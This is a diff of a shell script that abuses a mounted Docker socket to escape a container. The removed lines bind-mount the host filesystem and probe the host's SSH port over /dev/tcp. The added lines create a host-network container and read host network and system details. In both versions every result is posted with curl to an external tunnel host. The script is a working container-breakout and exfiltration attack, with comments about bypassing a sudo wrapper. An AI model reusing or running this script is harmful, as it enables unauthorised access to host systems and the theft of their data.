@@ -2,28 +2,23 @@
 URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [1] DOCKER API VERSION ---"
-  curl -s --unix-socket /var/run/docker.sock http://localhost/version | grep -o 'ApiVersion":"[^"]*"'
-
-  echo "--- [2] HOST FS ACCESS (VIA API) ---"
-  # This tries to read the host's /etc/hostname using the Docker API directly
-  # It bypasses the 'sudo docker run' wrapper entirely
+  echo "--- [!] BYPASS ATTEMPT: HOST NETWORK ---"
+  # Instead of mounting files, we try to take over the host's network stack
   curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
-    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"Binds":["/:/host:ro"]}}' > /tmp/out.json
+    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"NetworkMode":"host"}}' > /tmp/bypass.json
   
-  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/out.json | cut -d'"' -f4)
+  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/bypass.json | cut -d'"' -f4)
   if [ -n "$ID" ]; then
+    echo "Host Network Container Created: $ID"
     curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
-    sleep 2
-    echo "Host Hostname:"
+    # Now we check the host's real IP and interfaces
     curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
-      -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/hostname"]}'
+      -d '{"AttachStdout":true,"Cmd":["ip","addr"]}'
   else
-    echo "API Container Creation Blocked"
+    echo "Network Mode Bypass Blocked"
   fi
 
-  echo "--- [3] THE 172.17.0.1 PROBE ---"
-  # Since the banner grab was blank, we'll try a raw hex dump of the first 20 bytes
-  timeout 2 bash -c "exec 3<>/dev/tcp/172.17.0.1/22; head -c 20 <&3; echo" || echo "SSH Connect Timeout"
-
+  echo "--- [!] HOST CONFIG READ (NO RUN) ---"
+  # Try to read information without creating a container
+  curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "Name|KernelVersion|OperatingSystem"
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
